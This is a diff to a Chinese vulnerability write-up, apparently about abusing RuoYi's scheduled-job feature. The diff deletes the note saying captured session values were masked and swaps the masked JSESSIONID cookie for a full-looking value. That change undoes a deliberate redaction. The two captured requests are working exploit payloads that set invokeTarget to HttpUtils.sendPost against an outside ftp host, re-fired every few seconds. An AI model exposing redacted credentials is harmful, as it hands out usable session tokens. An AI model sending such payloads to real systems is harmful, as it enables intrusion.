@@ -20,7 +20,6 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
@@ -112,7 +111,7 @@ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 X-Requested-With: XMLHttpRequest
 sec-ch-ua-mobile: ?0
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
-Cookie: JSESSIONID=563******************************ea4
+Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4
 
 jobId=102&updateBy=admin&jobName=test&jobGroup=DEFAULT&invokeTarget=com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp%3A%2F%2F6a928e83f9.ipv6.1433.eu.org'%2C'')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=1&remark=
 ```  
@@ -127,7 +126,7 @@ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 X-Requested-With: XMLHttpRequest
 sec-ch-ua-mobile: ?0
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
-Cookie: JSESSIONID=563******************************ea4
+Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4
 
 
 createBy=admin&jobName=test1&jobGroup=DEFAULT&invokeTarget=com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp%3A%2F%2F6a928e83f9.ipv6.1433.eu.org'%2C'')&cronExpression=0%2F1+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
